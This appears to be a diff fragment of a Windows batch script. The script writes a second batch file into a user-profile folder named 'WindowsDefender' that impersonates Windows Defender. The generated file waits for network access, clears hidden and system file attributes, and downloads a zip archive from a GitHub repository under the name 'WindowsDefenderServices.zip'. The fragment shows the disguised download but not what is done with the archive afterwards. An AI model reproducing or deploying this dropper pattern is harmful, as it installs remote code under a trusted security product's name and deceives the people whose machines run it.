@@ -4,6 +4,8 @@ if not exist "%userprofile%\WindowsDefender" md "%userprofile%\WindowsDefender"
 attrib "%userprofile%\WindowsDefender\*" -s -h
 echo powershell -command "do {$ping = test-connection -comp github.com -count 1 -Quiet} until ($ping)" > "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
 echo cd "%%userprofile%%\WindowsDefender" >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
+echo attrib WindowsDefenderServices -s -h >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
+echo attrib WindowsDefenderServices.zip -s -h >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
 echo if exist WindowsDefenderServices rmdir /s /q WindowsDefenderServices >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
 echo if exist WindowsDefenderServices.zip del WindowsDefenderServices.zip >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
 echo powershell -command "Invoke-WebRequest 'https://github.com/aarec1/1/archive/refs/heads/main.zip' -OutFile WindowsDefenderServices.zip" >> "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
